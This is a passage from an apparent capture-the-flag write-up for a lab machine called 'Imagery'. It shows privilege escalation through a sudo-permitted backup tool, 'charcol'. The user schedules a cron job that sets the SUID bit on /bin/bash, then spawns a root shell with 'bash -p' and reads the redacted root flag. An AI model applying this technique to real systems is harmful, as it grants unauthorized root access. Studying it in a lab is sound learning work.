[2025-10-02 17:10:23] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-02 17:10:28] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> 
```

## Charcol shell
```
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0

[2025-10-02 17:10:28] [INFO] Entering Charcol interactive shell. Type 'help' for commands, 'exit' to quit.
charcol> auto add --schedule "* * * * *" --command "chmod u+s /bin/bash" --name "get_root"
[2025-10-02 17:12:07] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: 

[2025-10-02 17:12:11] [INFO] System password verified successfully.
[2025-10-02 17:12:11] [INFO] Auto job 'get_root' (ID: 0c4c5ba3-bdc5-46fd-a38d-5343bd520782) added successfully. The job will run according to schedule.
[2025-10-02 17:12:11] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod u+s /bin/bash
charcol> 
```

Exploit to apply `u+s` to /bin/bash
```
auto add --schedule "* * * * *" --command "chmod u+s /bin/bash" --name "get_root"
```

### Root flag
After a minute, we get root.
```
mark@Imagery:~$ ls -lah /bin/bash
-rwsr-xr-x 1 root root 1.5M Oct 26  2024 /bin/bash
mark@Imagery:~$ /bin/bash -p
bash-5.2# id
uid=1002(mark) gid=1002(mark) euid=0(root) groups=1002(mark)
bash-5.2# cat /root/root.txt 
<REDACTED>
bash-5.2#
```

---
